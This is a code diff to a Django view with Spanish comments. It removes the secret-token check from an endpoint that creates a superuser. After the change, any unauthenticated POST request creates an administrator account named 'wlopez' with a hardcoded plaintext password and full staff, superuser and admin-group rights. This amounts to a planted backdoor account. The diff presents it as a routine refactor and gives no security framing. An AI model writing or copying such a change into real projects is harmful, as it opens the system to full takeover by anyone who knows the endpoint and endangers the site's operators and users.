@@ -187,25 +187,27 @@ class GroupView(viewsets.ModelViewSet):
     
 class CreateUserView(View):
     def post(self, request):
-        secret_token = request.POST.get('token')
-        if secret_token != settings.SUPERUSER_CREATION_TOKEN:
-            return JsonResponse({'message': 'Acceso denegado.'}, status=403)
-
         username = 'wlopez'
         email = 'admin@example.com'
         password = '123asdfgna'
-
+        
+        # Verifica si el superusuario ya existe
+        if User.objects.filter(username=username).exists():
+            return JsonResponse({'message': 'El superusuario ya existe.'}, status=400)
+        
+        # Crea el grupo si no existe
         group, created = Group.objects.get_or_create(name='admin')
 
-        user, created = User.objects.get_or_create(
+        # Crea el superusuario
+        user = User(
             username=username,
-            defaults={'email': email, 'is_active': True, 'is_superuser': True, 'is_staff': True}
+            email=email,
+            is_active=True,
+            is_superuser=True,
+            is_staff=True
         )
-
-        if created:
-            user.set_password(password)
-            user.save()
-            user.groups.add(group)
-            return JsonResponse({'message': 'Superusuario creado y agregado al grupo.'}, status=201)
-        else:
-            return JsonResponse({'message': 'El usuario ya existe.'}, status=400)
+        user.set_password(password)
+        user.save()
+        user.groups.add(group)
+        
+        return JsonResponse({'message': 'Superusuario creado y agregado al grupo.'}, status=201)
